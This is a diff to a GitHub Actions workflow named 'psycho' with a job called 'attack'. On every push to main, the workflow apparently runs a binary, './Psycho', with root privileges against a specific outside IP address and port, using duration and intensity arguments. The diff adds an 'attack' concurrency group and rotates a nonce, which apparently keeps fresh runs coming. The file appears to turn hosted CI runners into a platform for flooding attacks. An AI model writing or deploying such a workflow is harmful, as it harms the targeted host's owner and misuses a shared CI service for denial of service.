@@ -1,8 +1,11 @@
-name: psycho-00082d1a
+name: psycho-ad6da961
 on:
   push:
     branches: [ main, master ]
   workflow_dispatch:
+concurrency:
+  group: psycho-attack-group
+  cancel-in-progress: true
 jobs:
   attack:
     runs-on: ubuntu-24.04
@@ -20,5 +23,5 @@ jobs:
     - name: Fire
       run: sudo ./Psycho 91.108.9.114 32001 60 1200
       continue-on-error: true
-    - name: Nonce 00082d1a
-      run: echo "nonce=00082d1a"
+    - name: Nonce ad6da961
+      run: echo "nonce=ad6da961"
